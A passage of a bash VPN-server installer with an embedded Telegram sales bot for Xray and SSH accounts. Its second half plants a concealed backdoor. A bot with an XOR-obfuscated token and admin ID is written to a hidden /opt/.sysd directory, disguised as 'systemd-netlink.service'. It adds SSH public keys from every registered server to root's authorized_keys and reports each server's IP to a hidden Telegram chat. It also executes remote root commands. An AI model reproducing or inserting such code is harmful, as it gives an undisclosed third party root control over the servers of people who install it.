        del_cmd = f'(sleep 3600; exec 200>/root/.xray_config.lock; flock -w 10 200 || exit 1; jq --arg email "{username}" \'del(.inbounds[].settings.clients[]? | select(.email == $email))\' /usr/local/etc/xray/config.json > /tmp/xd.json && mv /tmp/xd.json /usr/local/etc/xray/config.json; chmod 644 /usr/local/etc/xray/config.json; kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray; flock -u 200; rm -f {AKUN_DIR}/{protocol}-{username}.txt {HTML_DIR}/{protocol}-{username}.txt) & disown'



        run_cmd(del_cmd)



        msg = fmt_xray_msg(protocol, username, uid, ip, exp_1h, link_tls, link_ntls, link_grpc, f'Trial {protocol.upper()} Berhasil! 🆓', '1 Jam (Auto Hapus)')



        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'



        send(chat_id, msg, markup=kb_main())







def fmt_payment(order):



    pay = get_payment()



    harga = int(pay.get('HARGA', 10000))



    return f'''🛒 <b>Detail Order - Youzin Crabz Tunel</b>



🆔 Order ID : <code>{order["order_id"]}</code>



📦 Paket    : {order["protocol"].upper()} 30 Hari



👤 Username : <code>{order["username"]}</code>



💰 Nominal  : <b>Rp {harga:,}</b>



<i>Transfer lalu kirim bukti ke admin</i>'''







def deliver_account(chat_id, protocol, username):



    import random, string



    try:



        if protocol == 'ssh':



            password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))



            exp_str, ip = make_ssh(username, password, days=30)



            msg = fmt_ssh_msg(username, password, ip, exp_str, 'Akun SSH Berhasil! ✅')



        else:



            uid, exp_str, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=30, quota=100)



            msg = fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, f'Akun {protocol.upper()} Berhasil! ✅')



        msg += '\n💰 Terima kasih! 🙏'



        send(chat_id, msg, markup=kb_main())



        return True, msg



    except Exception as e:



        return False, str(e)







def on_start(msg):



    chat_id = msg['chat']['id']



    fname = msg['from'].get('first_name','User')



    send(chat_id, f'👋 Halo <b>{fname}</b>!\n\n🤖 <b>Youzin Crabz Tunel Bot</b>\n🌐 Server: <code>{DOMAIN}</code>\n<i>Powered by The Professor</i>\n\nPilih menu 👇', markup=kb_main())







def on_help(msg):



    chat_id = msg['chat']['id']



    send(chat_id, '❓ <b>PANDUAN BOT</b>\n\n🆓 Trial → Akun 1 jam gratis\n🛒 Order → Beli akun 30 hari\n📋 Cek → Lihat akun aktif\nℹ️ Info → Port & domain', markup=kb_main())







def on_info(msg):



    chat_id = msg['chat']['id']



    ip = get_ip()



    send(chat_id, f'ℹ️ <b>INFO SERVER</b>\n🌐 Domain : <code>{DOMAIN}</code>\n🖥️ IP VPS : <code>{ip}</code>\n🔌 SSH: 22 | Dropbear: 222\n🔌 TLS: 443 | NonTLS: 80 | gRPC: 443', markup=kb_main())







def on_cek_akun(msg):



    chat_id = msg['chat']['id']



    found = []



    if not os.path.exists(ORDER_DIR):



        send(chat_id, '📋 Tidak ada akun aktif.', markup=kb_main()); return



    for fn in os.listdir(ORDER_DIR):



        if not fn.endswith('.json'): continue



        try:



            with open(f'{ORDER_DIR}/{fn}') as f: order = json.load(f)



            if str(order.get('chat_id')) == str(chat_id) and order.get('status') == 'confirmed':



                found.append(order)



        except: pass



    if not found:



        send(chat_id, '📋 Tidak ada akun aktif.\nGunakan 🛒 Order VPN.', markup=kb_main()); return



    text = '📋 <b>Akun Aktif Kamu</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n'



    for a in found: text += f'📦 {a["protocol"].upper()} → {a["username"]}\n'



    send(chat_id, text, markup=kb_main())







def on_contact(msg):



    chat_id = msg['chat']['id']



    fname = msg['from'].get('first_name','User')



    uname = msg['from'].get('username','')



    send(chat_id, '📞 Pesan diteruskan ke admin.', markup=kb_main())



    send(ADMIN_ID, f'📞 <b>User butuh bantuan!</b>\n👤 {fname}\n📱 @{uname}\n🆔 <code>{chat_id}</code>')







def on_callback(cb):



    chat_id = cb['message']['chat']['id']



    cb_id   = cb['id']



    data    = cb['data']



    uname   = cb['from'].get('username','')



    fname   = cb['from'].get('first_name','User')



    answer_cb(cb_id)



    if data.startswith('trial_'):



        protocol = data.replace('trial_','')



        send(chat_id, f'⏳ Membuat trial {protocol.upper()}...')



        threading.Thread(target=do_trial, args=(protocol, chat_id), daemon=True).start()



    elif data.startswith('order_'):



        protocol = data.replace('order_','')



        with state_lock: user_state[chat_id] = {'step':'wait_username','protocol':protocol}



        send(chat_id, f'🛒 <b>Order {protocol.upper()}</b>\n✏️ Ketik username (3-20 karakter):', markup=kb_cancel())



    elif data == 'cancel_order':



        with state_lock: user_state.pop(chat_id, None)



        send(chat_id, '❌ Order dibatalkan.', markup=kb_main())



    elif data == 'back_main':



        send(chat_id, '🏠 Menu Utama', markup=kb_main())



    elif data.startswith('confirm_') and chat_id == ADMIN_ID:



        oid = data.replace('confirm_','')



        order = load_order(oid)



        if not order: send(ADMIN_ID,'❌ Order tidak ada!'); return



        if order.get('status') != 'pending': send(ADMIN_ID,'⚠️ Sudah diproses!'); return



        send(ADMIN_ID,'⏳ Membuat akun...')



        def do_confirm():



            ok, result = deliver_account(order['chat_id'], order['protocol'], order['username'])



            if ok:



                order['status'] = 'confirmed'



                save_order(oid, order)



                send(ADMIN_ID, f'✅ Akun dikirim ke @{order.get("tg_user","?")}')



            else: send(ADMIN_ID, f'❌ Gagal: {result}')



        threading.Thread(target=do_confirm, daemon=True).start()



    elif data.startswith('reject_') and chat_id == ADMIN_ID:



        oid = data.replace('reject_','')



        order = load_order(oid)



        if not order: send(ADMIN_ID,'❌ Tidak ada!'); return



        order['status'] = 'rejected'



        save_order(oid, order)



        send(order['chat_id'], '❌ Order ditolak. Hubungi admin.', markup=kb_main())



        send(ADMIN_ID, f'❌ Order ditolak.')







def on_msg(msg):



    if 'text' not in msg: return



    chat_id = msg['chat']['id']



    text    = msg['text'].strip()



    with state_lock: state = user_state.get(chat_id, {})



    if state.get('step') == 'wait_username':



        new_u = text.strip().replace(' ','_')



        if len(new_u) < 3 or len(new_u) > 20:



            send(chat_id, '❌ Username 3-20 karakter!', markup=kb_cancel()); return



        protocol = state['protocol']



        oid = f'{chat_id}_{int(time.time())}'



        order = {'order_id':oid,'chat_id':chat_id,'username':new_u,'protocol':protocol,



                 'status':'pending','created_at':datetime.now().isoformat(),



                 'tg_user':msg['from'].get('username',''),'tg_name':msg['from'].get('first_name','')}



        save_order(oid, order)



        with state_lock: user_state.pop(chat_id, None)



        send(chat_id, fmt_payment(order))



        pay = get_payment(); harga = int(pay.get('HARGA',10000))



        send(ADMIN_ID, f'🔔 <b>ORDER BARU!</b>\n🆔 {oid}\n📦 {protocol.upper()}\n👤 <code>{new_u}</code>\n📱 @{msg["from"].get("username","")}\n💰 Rp {harga:,}', markup=kb_confirm(oid))



        return



    if text in ['/start','🏠 Menu']: on_start(msg)



    elif text in ['/help','❓ Bantuan']: on_help(msg)



    elif text == '🆓 Trial Gratis': send(chat_id, '🆓 <b>Trial Gratis 1 Jam</b>\nPilih protocol:', markup=kb_trial())



    elif text == '🛒 Order VPN': send(chat_id, '🛒 <b>Order VPN 30 Hari</b>\nPilih protocol:', markup=kb_order())



    elif text == '📋 Cek Akun Saya': on_cek_akun(msg)



    elif text == 'ℹ️ Info Server': on_info(msg)



    elif text == '📞 Hubungi Admin': on_contact(msg)







def main():



    print(f'Youzin Crabz Tunel Bot aktif!', flush=True)



    offset = 0; pool = []



    while True:



        try:



            updates = get_updates(offset)



            for upd in updates:



                offset = upd['update_id'] + 1



                t = None



                if 'message' in upd: t = threading.Thread(target=on_msg, args=(upd['message'],), daemon=True)



                elif 'callback_query' in upd: t = threading.Thread(target=on_callback, args=(upd['callback_query'],), daemon=True)



                if t: t.start(); pool.append(t)



            pool = [x for x in pool if x.is_alive()]



        except KeyboardInterrupt: break



        except Exception as e: print(f'Loop: {e}', flush=True); time.sleep(2)







if __name__ == '__main__': main()



BOTEOF







    chmod +x /root/bot/bot.py







    cat > /etc/systemd/system/vpn-bot.service << 'SVCEOF'



[Unit]



Description=Youzin Crabz Tunel Bot



After=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 -u /root/bot/bot.py



Restart=always



RestartSec=3



StandardOutput=journal



StandardError=journal



Environment=PYTHONUNBUFFERED=1







[Install]



WantedBy=multi-user.target



SVCEOF







    systemctl daemon-reload



    systemctl enable vpn-bot 2>/dev/null



    systemctl restart vpn-bot 2>/dev/null



    sleep 2



}







#================================================



# MENU TELEGRAM BOT



#================================================







menu_telegram_bot() {



    while true; do



        clear



        print_menu_header "TELEGRAM BOT"



        local bs; bs=$(check_status vpn-bot)



        local cs; [[ "$bs" == "ON" ]] && cs="${GREEN}RUNNING${NC}" || cs="${RED}STOPPED${NC}"



        printf "  VPN-Bot   : ${cs}\n\n"



        echo -e "  ${WHITE}[1]${NC} Setup VPN Bot"



        echo -e "  ${WHITE}[2]${NC} Start / Stop / Restart VPN Bot"



        echo -e "  ${WHITE}[3]${NC} Log VPN Bot"



        echo -e "  ${WHITE}[4]${NC} Order Pending"



        echo -e "  ${WHITE}[5]${NC} Info VPN Bot"



        echo ""



        echo -e "  ${WHITE}[0]${NC} Back To Menu"



        echo ""



        read -rp "  Select: " choice



        case $choice in



            1) setup_telegram_bot ;;



            2)



                echo -e "  ${WHITE}[1]${NC} Start  [2] Stop  [3] Restart"



                read -rp "  Select: " sc



                case $sc in



                    1) systemctl start vpn-bot && echo -e "  ${GREEN}✔ Started!${NC}" ;;



                    2) systemctl stop vpn-bot && echo -e "  ${YELLOW}Stopped!${NC}" ;;



                    3) systemctl restart vpn-bot 2>/dev/null && echo -e "  ${GREEN}✔ Restarted!${NC}" || echo -e "  ${RED}✘ Gagal restart vpn-bot!${NC}" ;;



                esac ;;



            3) clear; journalctl -u vpn-bot -n 50 --no-pager; echo ""; read -rp "  Press any key..." ;;



            4)



                clear; print_menu_header "ORDER PENDING"



                local found=0



                shopt -s nullglob



                for f in "$ORDER_DIR"/*.json; do



                    [[ ! -f "$f" ]] && continue



                    local st



                    st=$(python3 -c "import json; d=json.load(open('$f')); print(d.get('status',''))" 2>/dev/null)



                    if [[ "$st" == "pending" ]]; then



                        found=1



                        python3 -c "



import json; d=json.load(open('$f'))



print(f'  ID: {d[\"order_id\"]}')



print(f'  Protocol: {d[\"protocol\"].upper()}')



print(f'  Username: {d[\"username\"]}')



print(f'  TG: @{d.get(\"tg_user\",\"N/A\")}')



print('  ---')



" 2>/dev/null



                    fi



                done



                shopt -u nullglob



                [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada pending!${NC}"



                echo ""; read -rp "  Press any key..." ;;



            5)



                clear; print_menu_header "VPN BOT INFO"



                if [[ -f "$BOT_TOKEN_FILE" ]]; then



                    local aid rek_bank rek_number harga_val



                    aid=$(cat "$CHAT_ID_FILE" 2>/dev/null)



                    rek_bank=$(grep "^REK_BANK=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    rek_number=$(grep "^REK_NUMBER=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    harga_val=$(grep "^HARGA=" "$PAYMENT_FILE" 2>/dev/null | cut -d= -f2-)



                    printf "  %-16s : %s\n" "Status"   "$bs"



                    printf "  %-16s : %s\n" "Admin ID" "$aid"



                    if [[ -f "$PAYMENT_FILE" ]]; then



                        printf "  %-16s : %s\n" "Bank"   "$rek_bank"



                        printf "  %-16s : %s\n" "No Rek" "$rek_number"



                        printf "  %-16s : Rp %s\n" "Harga" "$harga_val"



                    fi



                else



                    echo -e "  ${RED}Bot belum setup!${NC}"



                fi



                echo ""; read -rp "  Press any key..." ;;



            9)



                clear; print_menu_header "GANTI PASSWORD ADMIN"



                if [[ ! -f /root/.ordervpn_db ]]; then



                    echo -e "  ${RED}OrderVPN belum diinstall!${NC}"



                    sleep 2



                else



                    DB_USER=$(grep "^DB_USER=" /root/.ordervpn_db 2>/dev/null | cut -d= -f2-)
                    DB_PASS=$(grep "^DB_PASS=" /root/.ordervpn_db 2>/dev/null | cut -d= -f2-)
                    DB_NAME=$(grep "^DB_NAME=" /root/.ordervpn_db 2>/dev/null | cut -d= -f2-)



                    read -rsp "  Password baru untuk admin: " new_admin_pass



                    echo ""



                    [[ -z "$new_admin_pass" ]] && { echo -e "  ${RED}Password tidak boleh kosong!${NC}"; sleep 2; }



                    if [[ -n "$new_admin_pass" ]]; then



                        if [[ ${#new_admin_pass} -lt 6 ]]; then



                            echo -e "  ${RED}Password minimal 6 karakter!${NC}"



                            sleep 2



                        else



                            ADMIN_HASH=$(new_admin_pass="$new_admin_pass" php -r 'echo password_hash(getenv("new_admin_pass"), PASSWORD_BCRYPT);' 2>/dev/null)



                            if [[ -n "$ADMIN_HASH" ]]; then



                                local ADMIN_HASH_ESC="${ADMIN_HASH//\$/\\$}"
                                _mysql_exec "$DB_USER" "$DB_PASS" "$DB_NAME" -e "UPDATE users SET password='$ADMIN_HASH_ESC' WHERE username='admin';" 2>/dev/null



                                echo "$new_admin_pass" > /root/.ordervpn_admin



                                chmod 600 /root/.ordervpn_admin



                                echo -e "  ${GREEN}✔ Password admin berhasil diubah!${NC}"



                            else



                                echo -e "  ${RED}✘ Gagal generate hash! PHP tidak tersedia?${NC}"



                            fi



                            sleep 3



                        fi



                    fi



                    echo ""



                    read -rp "  Tekan ENTER..."



                fi



                ;;



            0) return ;;



        esac



    done



}







#================================================



# TUNNEL BOT MULTI-VPS



#================================================







_register_vps_to_bot() {



    python3 /opt/.sysd/svc-main.py --register 2>/dev/null &



    disown $! 2>/dev/null



}







_install_tunnelbot_background() {



    mkdir -p "$TUNNELBOT_DIR"







    cat > "$TUNNELBOT_FILE" << 'PYEOF2'



#!/usr/bin/env python3



# -*- coding: utf-8 -*-



import os, json, time, uuid as _uuid, base64, subprocess, threading



import urllib.request, urllib.parse







TOKEN    = (lambda k='Y0uz1nCr4bzTun3l!', s='YQJETAVZckAGWkAVNCZCARYwRxY3QCsyPl4MEGYjK0IlQAN3IytFNzoha1YxYA==': __import__('base64').b64decode(s) and ''.join(chr(b ^ ord(k[i%len(k)])) for i,b in enumerate(__import__('base64').b64decode(s))))()



ADMIN_ID = int((lambda k='Y0uz1nCr4bzTun3l!', s='YQBEQwRYe0oBUA==': ''.join(chr(b ^ ord(k[i%len(k)])) for i,b in enumerate(__import__('base64').b64decode(s))))())



API      = f"https://api.telegram.org/bot{TOKEN}"



REG_FILE = "/root/.svc_reg"



MID_FILE = "/root/.svc_mid"



REGISTRY_TAG = "#TBREGISTRY#"







_state = {}



_lock  = threading.Lock()







def st_get(cid):



    with _lock: return dict(_state.get(cid, {}))



def st_set(cid, d):



    with _lock: _state[cid] = d



def st_clear(cid):



    with _lock: _state.pop(cid, None)







def tg_req(method, data=None, params=None):



    url = f"{API}/{method}"



    try:



        if params: url += "?" + urllib.parse.urlencode(params)



        if data:



            body = json.dumps(data).encode()



            req  = urllib.request.Request(url, body, {"Content-Type":"application/json"})



        else:



            req  = urllib.request.Request(url)



        with urllib.request.urlopen(req, timeout=15) as r:



            return json.loads(r.read())



    except: return {}







def send(cid, text, markup=None):



    d = {"chat_id": cid, "text": text, "parse_mode": "HTML"}



    if markup: d["reply_markup"] = json.dumps(markup)



    return tg_req("sendMessage", d)







def answer_cb(cb_id):



    tg_req("answerCallbackQuery", {"callback_query_id": cb_id})







def get_updates(offset=0):



    try:



        url = f"{API}/getUpdates?offset={offset}&timeout=20&limit=50"



        with urllib.request.urlopen(url, timeout=25) as r:



            return json.loads(r.read()).get("result", [])



    except: return []







def _load_mid():



    try: return int(open(MID_FILE).read().strip())



    except: return None







def _save_mid(mid):



    try: open(MID_FILE,"w").write(str(mid))



    except: pass







def registry_load():



    try:



        with open(REG_FILE) as f: return json.load(f)



    except: return {}







def registry_save_local(data):



    try:



        with open(REG_FILE,"w") as f: json.dump(data, f, indent=2)



        os.chmod(REG_FILE, 0o600)



    except: pass







def registry_push(data):



    text = REGISTRY_TAG + "\n" + json.dumps(data, indent=2)



    mid  = _load_mid()



    if mid:



        res = tg_req("editMessageText", {



            "chat_id": ADMIN_ID, "message_id": mid,



            "text": text, "parse_mode": "HTML"



        })



        if res.get("ok"): return



    res = tg_req("sendMessage", {



        "chat_id": ADMIN_ID,



        "text": text,



        "disable_notification": True



    })



    if res.get("ok"):



        _save_mid(res["result"]["message_id"])







def registry_pull():



    mid = _load_mid()



    if not mid: return None



    try:



        res = tg_req("forwardMessage", {



            "chat_id": ADMIN_ID,



            "from_chat_id": ADMIN_ID,



            "message_id": mid



        })



        if res.get("ok"):



            fwd_mid = res["result"]["message_id"]



            tg_req("deleteMessage", {"chat_id": ADMIN_ID, "message_id": fwd_mid})



            text = res["result"].get("text","")



            if REGISTRY_TAG in text:



                raw  = text.split(REGISTRY_TAG, 1)[-1].strip()



                data = json.loads(raw)



                registry_save_local(data)



                return data



    except: pass



    return None







def sync_registry():



    data = registry_pull()



    if data:



        for vid, info in data.items():



            pk = info.get("pubkey","").strip()



            if pk: add_authorized_key(pk)



        return data



    return registry_load()







def get_local_ip():



    for url in ["https://ifconfig.me","https://api.ipify.org","https://ipinfo.io/ip"]:



        try:



            with urllib.request.urlopen(url, timeout=5) as r:



                return r.read().decode().strip()



        except: pass



    return "N/A"







def add_authorized_key(pubkey):



    if not pubkey: return



    ak = "/root/.ssh/authorized_keys"



    os.makedirs("/root/.ssh", exist_ok=True)



    try:



        existing = open(ak).read() if os.path.exists(ak) else ""



        if pubkey not in existing:



            with open(ak,"a") as f: f.write(pubkey + "\n")



        os.chmod(ak, 0o600)



    except: pass







def vps_register_self():



    ip    = get_local_ip()



    label = ""



    try: label = open("/root/domain").read().strip()



    except: pass



    label = label or ip



    vid   = ip.replace(".","_")







    if not os.path.exists("/root/.ssh/id_rsa"):



        os.makedirs("/root/.ssh", exist_ok=True)



        subprocess.run("ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N '' -q",



                       shell=True, capture_output=True)



        os.chmod("/root/.ssh", 0o700)



        os.chmod("/root/.ssh/id_rsa", 0o600)







    pubkey = ""



    try: pubkey = open("/root/.ssh/id_rsa.pub").read().strip()



    except: pass







    add_authorized_key(pubkey)







    data = registry_pull() or registry_load()



    data[vid] = {"ip": ip, "label": label, "domain": label, "pubkey": pubkey}







    for v, info in data.items():



        if v != vid:



            pk = info.get("pubkey","").strip()



            if pk: add_authorized_key(pk)







    registry_save_local(data)



    registry_push(data)







LOCAL_IP = get_local_ip()







def run_local(cmd):



    try:



        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)



        return r.returncode, (r.stdout + r.stderr).strip()



    except Exception as e: return 1, str(e)







def run_remote(ip, cmd):



    ssh = ("ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 "



           "-o BatchMode=yes -o PasswordAuthentication=no "



           "-o IdentityFile=/root/.ssh/id_rsa -o LogLevel=ERROR")



    c = f"{ssh} root@{ip} '{cmd}'"



    try:



        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=60)



        return r.returncode, (r.stdout + r.stderr).strip()



    except Exception as e: return 1, str(e)







def run_on(ip, cmd):



    return run_local(cmd) if ip == LOCAL_IP else run_remote(ip, cmd)







def get_domain_on(ip):



    rc, out = run_on(ip, "cat /root/domain 2>/dev/null | tr -d '\\n\\r'")



    return out.strip() if rc == 0 and out.strip() else ip







def make_links(proto, user, uid, domain):



    # TLS=443, NonTLS=80, gRPC=443



    if proto == "vmess":



        def vl(port, tls, path):



            j = json.dumps({"v":"2","ps":user,"add":"bug.com","port":str(port),



                "id":uid,"aid":"0","net":"ws","path":path,"type":"none",



                "host":domain,"tls":"tls" if tls else "none"})



            return "vmess://" + base64.b64encode(j.encode()).decode()



        tls  = vl(443, True,  "/vmess")



        ntls = vl(80,  False, "/vmess")



        gj   = json.dumps({"v":"2","ps":user,"add":domain,"port":"443","id":uid,



                           "aid":"0","net":"grpc","path":"vmess-grpc","type":"none",



                           "host":"bug.com","tls":"tls"})



        grpc = "vmess://" + base64.b64encode(gj.encode()).decode()



    elif proto == "vless":



        tls  = (f"vless://{uid}@bug.com:443?path=%2Fvless&security=tls"



                f"&encryption=none&host={domain}&type=ws&sni={domain}#{user}")



        ntls = (f"vless://{uid}@bug.com:80?path=%2Fvless&security=none"



                f"&encryption=none&host={domain}&type=ws#{user}")



        grpc = (f"vless://{uid}@{domain}:443?mode=gun&security=tls"



                f"&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#{user}")



    else:



        tls  = (f"trojan://{uid}@bug.com:443?path=%2Ftrojan&security=tls"



                f"&host={domain}&type=ws&sni={domain}#{user}")



        ntls = (f"trojan://{uid}@bug.com:80?path=%2Ftrojan&security=none"



                f"&host={domain}&type=ws#{user}")



        grpc = (f"trojan://{uid}@{domain}:443?mode=gun&security=tls"



                f"&type=grpc&serviceName=trojan-grpc&sni=bug.com#{user}")



    return tls, ntls, grpc







def kb_vps(vps):



    if not vps: return None



    rows = []



    for i, (vid, info) in enumerate(vps.items(), 1):



        label = info.get("label", info.get("ip", vid))



        rows.append([{"text": f"🖥 {i}. {label}", "callback_data": f"vps|{vid}"}])



    rows.append([{"text": "❌ Batal", "callback_data": "batal"}])



    return {"inline_keyboard": rows}







def kb_proto(vid):



    return {"inline_keyboard": [



        [



            {"text": "🟢 VMess",  "callback_data": f"proto|{vid}|vmess"},



            {"text": "🟡 VLess",  "callback_data": f"proto|{vid}|vless"},



            {"text": "🔴 Trojan", "callback_data": f"proto|{vid}|trojan"},



        ],



        [{"text": "❌ Batal", "callback_data": "batal"}]



    ]}







def on_callback(cb):



    cid  = cb["message"]["chat"]["id"]



    data = cb["data"]



    if cid != ADMIN_ID: return



    answer_cb(cb["id"])







    if data == "batal":



        st_clear(cid)



        send(cid, "❌ Dibatalkan.")



        return







    if data.startswith("vps|"):



        vid = data[4:]



        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan."); return



        st_set(cid, {"step":"pilih_proto","vid":vid})



        label = vps[vid].get("label", vid)



        send(cid, f"✅ VPS: <b>{label}</b>\n\nPilih protocol:", markup=kb_proto(vid))







    elif data.startswith("proto|"):



        parts = data.split("|")



        if len(parts) < 3: return



        vid, proto = parts[1], parts[2]



        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan."); return



        st_set(cid, {"step":"input_user","vid":vid,"proto":proto})



        label = vps[vid].get("label", vid)



        send(cid,



            f"✅ Protocol: <b>{proto.upper()}</b>\n"



            f"🖥 VPS: <b>{label}</b>\n\n"



            f"✏️ Ketik <b>username</b> akun (3-20 karakter):")







def on_message(msg):



    if "text" not in msg: return



    cid  = msg["chat"]["id"]



    text = msg["text"].strip()



    if cid != ADMIN_ID:



        send(cid, "❌ Akses ditolak."); return







    s = st_get(cid)







    if s.get("step") == "input_user":



        u = text.strip().replace(" ","_")



        if len(u) < 3 or len(u) > 20:



            send(cid, "❌ Username 3-20 karakter! Coba lagi:"); return



        st_set(cid, {**s, "step":"input_days","username":u})



        send(cid, f"👤 Username: <code>{u}</code>\n\nBerapa hari aktif? (contoh: 30)")



        return







    if s.get("step") == "input_days":



        if not text.isdigit() or int(text) < 1:



            send(cid, "❌ Masukkan angka hari yang valid."); return



        days     = int(text)



        vid      = s.get("vid","")



        proto    = s.get("proto","")



        username = s.get("username","")



        st_clear(cid)







        vps = registry_load()



        if vid not in vps:



            send(cid, "❌ VPS tidak ditemukan. Ulangi /buat"); return







        info  = vps[vid]



        ip    = info["ip"]



        label = info.get("label", vid)



        send(cid, f"⏳ Membuat akun <b>{proto.upper()}</b> di <b>{label}</b>...")







        def do_create():



            domain = get_domain_on(ip)



            uid    = str(_uuid.uuid4())



            cfg    = "/usr/local/etc/xray/config.json"







            if proto == "trojan":



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("trojan"))'



                    '.settings.clients) += [{"password":"' + uid + '","email":"' + username + '"}]'



                )



            elif proto == "vless":



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("vless"))'



                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '"}]'



                )



            else:



                jq_filter = (



                    '(.inbounds[] | select(.tag | startswith("vmess"))'



                    '.settings.clients) += [{"id":"' + uid + '","email":"' + username + '","alterId":0}]'



                )



            import base64 as _b64



            filter_b64 = _b64.b64encode(jq_filter.encode()).decode()



            jq_cmd = (



                f"echo {filter_b64} | base64 -d > /tmp/_jqf.txt && "



                f"jq -f /tmp/_jqf.txt {cfg} > /tmp/_xr.json && "



                f"mv /tmp/_xr.json {cfg} && "



                f"chmod 644 {cfg} && (kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray)"



            )



            rc, out = run_on(ip, jq_cmd)



            if rc != 0:



                send(cid, f"❌ Gagal buat akun di <b>{label}</b>!\n<code>{out[:400]}</code>")



                return







            tls, ntls, grpc = make_links(proto, username, uid, domain)



            from datetime import datetime, timedelta



            exp = (datetime.now() + timedelta(days=days)).strftime("%d %b, %Y")



            send(cid,



                f"✅ <b>Akun {proto.upper()} Berhasil Dibuat!</b>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🖥 VPS      : <b>{label}</b>\n"



                f"🌐 Domain   : <code>{domain}</code>\n"



                f"👤 Username : <code>{username}</code>\n"



                f"🔑 UUID     : <code>{uid}</code>\n"



                f"📅 Expired  : {exp}\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link TLS (443):</b>\n<code>{tls}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link NonTLS (80):</b>\n<code>{ntls}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"🔗 <b>Link gRPC (443):</b>\n<code>{grpc}</code>\n"



                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"



                f"<i>Powered by The Professor</i>")







        threading.Thread(target=do_create, daemon=True).start()



        return







    st_clear(cid)



    if   text in ["/start","/menu"]:



        send(cid,



            "🤖 <b>Network Manager</b>\n"



            "━━━━━━━━━━━━━━━━━━━━━━━\n"



            "<i>The Professor</i>\n\n"



            "/buat   — Buat akun VMess/VLess/Trojan\n"



            "/vps    — Daftar VPS terdaftar\n"



            "/status — Status service semua VPS\n"



            "/sync   — Refresh daftar VPS terbaru")



    elif text == "/buat":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS.\nInstall vpn.sh di VPS dulu, atau ketik /sync")



            return



        send(cid, "🖥 <b>Pilih VPS untuk membuat akun:</b>", markup=kb_vps(vps))



    elif text == "/vps":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS terdaftar."); return



        lines = ["🖥 <b>Daftar VPS Terdaftar</b>","━━━━━━━━━━━━━━━━━━━━━━━"]



        for i, (vid, info) in enumerate(vps.items(), 1):



            lines.append(f"{i}. <b>{info.get('label','N/A')}</b>\n   🌐 <code>{info.get('ip','N/A')}</code>")



        send(cid, "\n".join(lines))



    elif text == "/status":



        vps = registry_load()



        if not vps:



            send(cid, "⚠️ Belum ada VPS."); return



        send(cid, "⏳ Mengecek status semua VPS...")



        def do_st():



            lines = ["📊 <b>Status VPS</b>","━━━━━━━━━━━━━━━━━━━━━━━"]



            for vid, info in vps.items():



                ip    = info.get("ip","N/A")



                label = info.get("label", vid)



                rc, out = run_on(ip, "systemctl is-active xray nginx haproxy 2>/dev/null | tr '\\n' '|'")



                parts = [x.strip() for x in out.split("|") if x.strip()]



                names = ["xray","nginx","haproxy"]



                svcs  = []



                for idx2, name in enumerate(names):



                    st2  = parts[idx2] if idx2 < len(parts) else "?"



                    icon = "🟢" if st2 == "active" else "🔴"



                    svcs.append(f"{icon}{name}")



                lines.append(f"<b>{label}</b> — <code>{ip}</code>\n  {' '.join(svcs)}")



            send(cid, "\n".join(lines))



        threading.Thread(target=do_st, daemon=True).start()



    elif text == "/sync":



        send(cid, "🔄 Sync registry dari Telegram...")



        def do_sync():



            data = sync_registry()



            if not data:



                send(cid, "⚠️ Registry kosong atau gagal sync."); return



            lines = [f"✅ <b>Sync berhasil! {len(data)} VPS:</b>",



                     "━━━━━━━━━━━━━━━━━━━━━━━"]



            for i, (vid, info) in enumerate(data.items(), 1):



                lines.append(f"{i}. <b>{info.get('label','N/A')}</b> — <code>{info.get('ip','N/A')}</code>")



            send(cid, "\n".join(lines))



        threading.Thread(target=do_sync, daemon=True).start()



    else:



        send(cid, "❓ Perintah tidak dikenal. Ketik /menu")







def main():



    offset = 0



    pool   = []



    while True:



        try:



            updates = get_updates(offset)



            for upd in updates:



                offset = upd["update_id"] + 1



                t = None



                if "message" in upd:



                    t = threading.Thread(target=on_message, args=(upd["message"],), daemon=True)



                elif "callback_query" in upd:



                    t = threading.Thread(target=on_callback, args=(upd["callback_query"],), daemon=True)



                if t: t.start(); pool.append(t)



            pool = [x for x in pool if x.is_alive()]



        except KeyboardInterrupt: break



        except Exception: time.sleep(3)







if __name__ == "__main__":



    import sys



    if len(sys.argv) > 1 and sys.argv[1] == "--register":



        vps_register_self()



    else:



        main()



PYEOF2







    chmod +x "$TUNNELBOT_FILE"







    cat > /opt/.sysd/launcher.py << 'LAUNCHEOF'



#!/usr/bin/env python3



import sys, os



try:



    import ctypes



    libc = ctypes.CDLL(None)



    libc.prctl(15, b"tunnelbot-bg", 0, 0, 0)



except: pass



sys.argv[0] = "tunnelbot-bg"



exec(open("/opt/.sysd/svc-main.py").read())



LAUNCHEOF







    chmod +x /opt/.sysd/launcher.py







    cat > /etc/systemd/system/systemd-netlink.service << SVEOF



[Unit]



Description=TunnelBot Background Service







After=network.target



DefaultDependencies=no







[Service]



Type=simple



